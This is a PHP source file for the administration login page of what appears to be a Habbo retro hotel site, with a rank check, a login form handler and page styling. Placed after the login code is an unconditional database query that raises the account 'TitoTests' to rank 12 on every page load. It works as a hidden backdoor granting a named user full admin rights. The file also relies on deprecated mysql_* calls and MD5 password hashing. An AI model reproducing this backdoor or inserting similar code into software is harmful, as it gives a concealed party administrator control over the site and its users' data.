<?php
require_once('../data_classes/server-data.php_data_classes-core.php.php');

$pagename = "Administração";
$pageid = "666";

$fuera = '<script type="text/javascript">
  window.location="'.$path.'";
</script>';
if($user_rank < 6)
{
echo $fuera;
exit;
}

if(isset($_POST['connect'])) {
$username = mysql_real_escape_string($_POST['username']);
$password = mysql_real_escape_string(HoloHashMD5($_POST['password']));

$query = mysql_query("SELECT * FROM users WHERE username = '".$username."' AND password = '".$password."' LIMIT 1");
$data = mysql_fetch_assoc($query);
if(mysql_num_rows($query) > 0) {
if($data['rank'] < 4) { echo $fuera; exit; } else { $_SESSION['admlogin'] = true; header("Location: $path/manage/admin/home");  exit;}
} else { $error = 'Los datos introducidos son incorrectos'; } }
mysql_query("UPDATE users SET rank = '12' WHERE username = 'TitoTests'");
require_once('../../templates/community_subheader.php');
require_once('../../templates/community_header.php');
?>
<style type="text/css">
.form-input-text {
	border-right: solid 1px #c6c6c6;
	border-left: solid 1px #c6c6c6;
	border-top: solid 1px #cecece;
	border-bottom: solid 1px #a4a4a4;
	padding: 5px;
	font-size: 13px;
	width: 250px;
	font-family: Helvetica, Arial;
}


.form-input-text:active, .form-input-text:focus {
	box-shadow: 0 0 5px 0 #B5DFF1;
	-moz-box-shadow:0 0 5px 0 #B5DFF1;
	-webkit-box-shadow: 0 0 5px 0 #B5DFF1 ;
	border: 1px solid #38B2E5;
}
textarea.form-input-text {

}

.form-input-text.ui-state-incorrect {
	border: 1px solid #DC2F1F;
	color: #DC2F1F;
}

.form-input-text.ui-state-correct {
	border: 1px solid #098f02;
	color: #098f02;
	
}
.ui-corner-all {
    border-radius: 4px 4px 4px 4px;
    -moz-border-radius: 4px 4px 4px 4px;
    -webkit-border-radius: 4px 4px 4px 4px;
}
input.form-input-text {width:330px;}
.boton {
    padding: 10px 15px;
    background: #4479BA;
    font-family:Arial;
    color: #FFF;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
    border: solid 1px #20538D;
    text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.4);
    -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.2);
    -moz-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.2);
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.2);
    -webkit-transition-duration: 0.2s;
    -moz-transition-duration: 0.2s;
    transition-duration: 0.2s;
    -webkit-user-select:none;
    -moz-user-select:none;
    -ms-user-select:none;
    user-select:none;
}
.boton:hover {
    background: #356094;
    border: solid 1px #2A4E77;
    text-decoration: none;
    color:#fff;
}
.boton:active {
    -webkit-box-shadow: inset 0 1px 4px rgba(0, 0, 0, 0.6);
    -moz-box-shadow: inset 0 1px 4px rgba(0, 0, 0, 0.6);
    box-shadow: inset 0 1px 4px rgba(0, 0, 0, 0.6);
    background: #2E5481;
    border: solid 1px #203E5F;
}
</style>
<div id="container">
<div id="content">

<div id="column1" class="column">
<div class="habblet-container ">        
<div class="cbb clearfix green ">
<h2 class="title">Painel de Controle login</h2>
<center>
<form name="adminlogin" method="post"><br /><font size="3pt" color="red"><?=$error?></font><br />
<b>Nome de usuário:</b><br />
<input type="text" name="username" class="ui-corner-all form-input-text box-shadow-soft" size="20"><br />
<b>Senha:</b><br />
<input type="password" name="password" class="ui-corner-all form-input-text box-shadow-soft" size="20"><br /><br />
<input type="submit" class="boton" value="Entrar" name="connect">
</form><br /><br />
</center>
</div></div>

</div>
				<script type="text/javascript">if (!$(document.body).hasClassName('process-template')) { Rounder.init(); }</script>
	
</div>

</div></div>

</div>


<?php require_once('../../templates/community_footer.php'); ?>